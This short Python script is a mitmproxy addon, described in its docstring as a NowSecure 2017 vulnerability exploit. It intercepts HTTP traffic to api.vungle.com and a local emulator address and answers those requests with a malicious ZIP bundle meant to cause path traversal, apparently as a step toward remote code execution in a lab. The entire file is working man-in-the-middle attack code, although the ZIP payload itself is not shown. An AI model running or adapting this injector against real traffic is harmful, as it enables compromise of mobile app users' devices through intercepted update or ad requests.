#!/usr/bin/env python3
"""
NowSecure 2017 Vulnerability Exploit
Intercepts HTTP requests and injects malicious ZIP with path traversal
"""

import mitmproxy.http
from pathlib import Path

class PayloadInjector:
    def __init__(self):
        # Use absolute path to RCELab_workspace/exploit_bundle.zip
        home_dir = Path.home()
        self.exploit_path = home_dir / "RCELab_workspace" / "exploit_bundle.zip"

        print(f"[INIT] Looking for exploit bundle at: {self.exploit_path}")
        print(f"[INIT] File exists: {self.exploit_path.exists()}")

        self.target_urls = [
            "api.vungle.com",
            "10.0.2.2:8000"
        ]
        
    def request(self, flow: mitmproxy.http.HTTPFlow) -> None:
        if any(host in flow.request.pretty_host for host in self.target_urls):
            if self.exploit_path.exists():
                print(f"[INJECT] {flow.request.pretty_url} -> exploit_bundle.zip ({self.exploit_path.stat().st_size} bytes)")
                
                with open(self.exploit_path, 'rb') as f:
                    payload = f.read()
                
                flow.response = mitmproxy.http.Response.make(
                    200,
                    payload,
                    {"Content-Type": "application/zip"}
                )
            else:
                print(f"[ERROR] Exploit bundle not found: {self.exploit_path}")

addons = [PayloadInjector()]
